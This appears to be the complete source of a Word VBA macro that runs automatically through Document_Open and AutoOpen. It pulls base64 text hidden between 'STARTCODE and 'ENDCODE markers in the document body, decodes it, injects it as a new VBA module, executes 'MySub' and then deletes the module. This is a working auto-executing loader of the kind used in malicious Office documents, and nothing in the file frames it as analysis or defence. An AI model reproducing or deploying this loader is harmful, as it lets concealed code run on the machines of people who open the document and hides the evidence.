Sub MyMacro()
    Dim para As Paragraph
    Dim base64Text As String
    Dim comp As VBComponent
    Dim codeModule As CodeModule
    Dim line As String
    Dim decodedCode As String
    Dim i As Long
    Dim totalParas As Long

    totalParas = ActiveDocument.Paragraphs.Count

    ' Extract base64 code between 'STARTCODE and 'ENDCODE
    For i = 1 To totalParas
        If Trim(ActiveDocument.Paragraphs(i).Range.Text) Like "*'STARTCODE*" Then
            i = i + 1
            Do While i <= totalParas
                line = Trim(ActiveDocument.Paragraphs(i).Range.Text)
                If line Like "*'ENDCODE*" Then Exit Do
                base64Text = base64Text & line
                i = i + 1
            Loop
            Exit For
        End If
    Next i

    If base64Text = "" Then
        MsgBox "No base64 code found between 'STARTCODE and 'ENDCODE"
        Exit Sub
    End If

    ' Decode base64
    decodedCode = DecodeBase64(base64Text)

    If decodedCode = "" Then
        MsgBox "Base64 decoding failed"
        Exit Sub
    End If

    ' Inject decoded VBA code into a new module
    Set comp = ThisDocument.VBProject.VBComponents.Add(vbext_ct_StdModule)
    Set codeModule = comp.CodeModule
    codeModule.AddFromString decodedCode

    ' Run a known entrypoint (adjust this if needed)
    Application.Run "MySub"

    ' Optional: remove the module after execution
    ThisDocument.VBProject.VBComponents.Remove comp
End Sub

Function DecodeBase64(ByVal b64 As String) As String
    Dim xmlDoc As Object
    Dim xmlNode As Object
    Dim byteStream As Object

    On Error GoTo ErrHandler

    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set xmlNode = xmlDoc.createElement("b64")
    xmlNode.DataType = "bin.base64"
    xmlNode.Text = b64

    Set byteStream = CreateObject("ADODB.Stream")
    byteStream.Type = 1 ' adTypeBinary
    byteStream.Open
    byteStream.Write xmlNode.nodeTypedValue
    byteStream.Position = 0
    byteStream.Type = 2 ' adTypeText
    byteStream.Charset = "utf-8"
    DecodeBase64 = byteStream.ReadText
    byteStream.Close
    Exit Function

ErrHandler:
    DecodeBase64 = ""
End Function

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
